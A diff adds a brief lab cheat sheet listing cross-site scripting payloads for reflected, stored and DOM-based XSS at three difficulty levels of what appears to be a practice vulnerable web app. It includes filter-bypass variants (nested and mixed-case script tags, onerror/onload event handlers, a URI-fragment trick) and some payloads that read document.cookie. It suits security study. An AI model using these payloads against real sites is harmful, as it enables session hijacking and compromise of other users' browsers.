@@ -1,0 +1,17 @@
+XSS – every user who visits same page payload gets execute in their browser
+
+XSS Reflected
+Low-     <script>alert(1)</script> 
+Medium-  <scr<script>ipt>alert('hi')</script>, <SCRIPT>alert('hi')</script>, <Script>alert('hi')</script> …. it looking for starting tag
+High-    <img src='' onerror='alert("hacked")'>, <svg onload='alert("hacked")'> …. not taking script tag, taking all html events 
+
+XSS Stored
+Low-     <script>alert(1)</script> ….in both fields
+Medium-  <scr<script>ipt>alert('hi')</script>, <SCRIPT>alert('hi')</script>, <Script>alert('hi')</script> ….in name field  it looking for starting tag 
+High-    <img src='' onerror='alert("hacked")'>, <svg onload='alert("hacked")'> ….in name field --> not taking script tag, taking all html events.
+
+XSS DOM
+Low-     <script>alert(document.cookie)</script>
+Medium-  <img src='' onerror='alert("hacked")'>, <svg%20onload=%27alert("hacked")%27> … <> or > working too
+High-    default=#English<script>alert(document.cookie)</script> … add # before <script> anywhere
+….The technique to avoid sending the payload to the server hinges on the fact that URI fragments (the part in the URI after the “#”) is not sent to the server by the browser.
